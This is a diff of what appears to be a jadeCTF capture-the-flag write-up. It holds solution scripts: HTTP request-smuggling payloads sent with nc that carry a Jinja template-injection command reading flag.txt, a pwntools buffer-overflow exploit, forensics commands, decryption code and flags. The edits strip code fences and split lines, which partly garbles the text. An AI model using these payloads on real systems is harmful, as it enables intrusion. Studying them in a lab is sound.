@@ -55,7 +55,8 @@ Twitter：@wgpsec
 ```
 import requests
 
-url = "http://34.76.206.46:10008/?page="
+url = "http://34.76.206.46:
+10008/?page="
 flag = ""
 for i in range(1,999999):
     r1 = requests.get(url+str(i))
@@ -65,14 +66,10 @@ for i in range(1,999999):
         flag = flag + r3.text
         print(i)
         print(flag)
-```
-
-
-
-```
 import requests
 
-url = "http://34.76.206.46:10008/?page="
+url = "http://34.76.206.46:
+10008/?page="
 flag = ""
 
 def fib(n):
@@ -85,65 +82,30 @@ for i in range(2,100):
     r1 = requests.get(url+str(fib(i)))
     flag = flag + r1.text
     print(flag)
-```
-
-
-
-```
-echo -en "GET / HTTP/1.1rnHost: 34.76.206.46:10014rnContent-Length: 85rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=n00b HTTP/1.1rnHost: localhostrnContent-Length: 35rnrnGET / HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
-```
-
-
-
-```
-echo -en "GET /cat HTTP/1.1rnHost: 34.76.206.46:10014rnContent-Length: 96rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=%7b%7b9*9%7d%7d HTTP/1.1rnHost: localhostrnContent-Length: 36rnrnGET /c HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
-```
-
-
-
-```
+echo -en "GET / HTTP/1.1rnHost: 34.76.206.46:
+10014rnContent-Length: 85rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=n00b HTTP/1.1rnHost: localhostrnContent-Length: 35rnrnGET / HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
+echo -en "GET /cat HTTP/1.1rnHost: 34.76.206.46:
+10014rnContent-Length: 96rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=%7b%7b9*9%7d%7d HTTP/1.1rnHost: localhostrnContent-Length: 36rnrnGET /c HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
 {{lipsum.__globals__['os'].popen('cat flag.txt').read()}}
-```
-
-
-
-```
-echo -en "GET /cat HTTP/1.1rnHost: 34.76.206.46:10014rnContent-Length: 222rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=%7b%7b%6c%69%70%73%75%6d%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%6c%73%27%29%2e%72%65%61%64%28%29%7d%7d HTTP/1.1rnHost: localhostrnContent-Length: 36rnrnGET /c HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
-```
-
-
-
-```
-echo -en "GET /cat HTTP/1.1rnHost: 34.76.206.46:10014rnContent-Length: 252rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=%7b%7b%6c%69%70%73%75%6d%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%63%61%74%20%66%6c%61%67%2e%74%78%74%27%29%2e%72%65%61%64%28%29%7d%7d HTTP/1.1rnHost: localhostrnContent-Length: 36rnrnGET /c HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
-```
-
-
-
-```
+echo -en "GET /cat HTTP/1.1rnHost: 34.76.206.46:
+10014rnContent-Length: 222rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=%7b%7b%6c%69%70%73%75%6d%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%6c%73%27%29%2e%72%65%61%64%28%29%7d%7d HTTP/1.1rnHost: localhostrnContent-Length: 36rnrnGET /c HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
+echo -en "GET /cat HTTP/1.1rnHost: 34.76.206.46:
+10014rnContent-Length: 252rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=%7b%7b%6c%69%70%73%75%6d%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%63%61%74%20%66%6c%61%67%2e%74%78%74%27%29%2e%72%65%61%64%28%29%7d%7d HTTP/1.1rnHost: localhostrnContent-Length: 36rnrnGET /c HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
 python vol.py -f ./workspace/sandeep.raw 
 --profile=Win7SP1x64 dumpfiles 
 -Q 0x000000007ed6c9c0 -D ./workspace/
-```
-
-
-
-```
 python vol.py -f ./workspace/sandeep.raw 
 --profile=Win7SP1x64 
 dumpfiles -Q 0x000000007dec85f0 
 -D ./workspace/
-```
-
-
-
-```
 From - Thu, 20 Oct 2022 05:34:22 GMT
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00800000
 Message-ID: <80466942-4a56-c2e7-1666-501f6fb92eab@gmail.com>
 Date: Wed, 19 Oct 2022 22:34:18 -0700
 MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:102.0) Gecko/20100101
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:
+102.0) Gecko/20100101
  Thunderbird/102.3.3
 Content-Language: en-US
 To: pearl8stoner@gmail.com
@@ -160,7 +122,8 @@ X-Mozilla-Status2: 00800000
 Message-ID: <3075f4bc-8f46-efaf-029c-1e88c0c878a7@gmail.com>
 Date: Wed, 19 Oct 2022 22:44:09 -0700
 MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:102.0) Gecko/20100101
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:
+102.0) Gecko/20100101
  Thunderbird/102.3.3
 Content-Language: en-US
 To: pearl8stoner@gmail.com
@@ -183,7 +146,8 @@ X-Mozilla-Status2: 00800000
 Message-ID: <885b4ae7-3092-c18e-9fa0-c71cea850a93@gmail.com>
 Date: Wed, 19 Oct 2022 22:44:47 -0700
 MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:102.0) Gecko/20100101
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:
+102.0) Gecko/20100101
  Thunderbird/102.3.3
 Content-Language: en-US
 To: pearl8stoner@gmail.com
@@ -207,11 +171,6 @@ int main() {
    }
    return 0;
 }
-```
-
-
-
-```
 import base64
 import binascii
 import string
@@ -274,17 +233,7 @@ def main(flag00):
 
 # main
 main("y")
-```
-
-
-
-```
 jctf{p34rl_1s_look1ng_f0r_Sandeep}
-```
-
-
-
-```
 import base64
 from Crypto.Cipher import AES, DES
 with open('./file.fun', 'rb') as f:
@@ -298,34 +247,14 @@ m = cipher.decrypt(c)
 print(m.decode()) #jadeCTF{j1gs4w_puzzl3_1s_n0t_s0_34sy}
 with open('flag.txt','wb') as f:
     f.write(m)
-```
-
-
-
-```
 jadeCTF{cryptoisfunorisit}
-```
-
-
-
-```
 from pwn import *
 p = remote('34.76.206.46',10002)
 # p = process('./babypwn')
 py = 'a'*520 + p64(0x0000000000400746)
 p.sendline(py)
 p.interactive()
-```
-
-
-
-```
 jadeCTF{buff3r_0v3rfl0ws_4r3_d4ng3r0u5}
-```
-
-
-
-```
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 from pwn import *
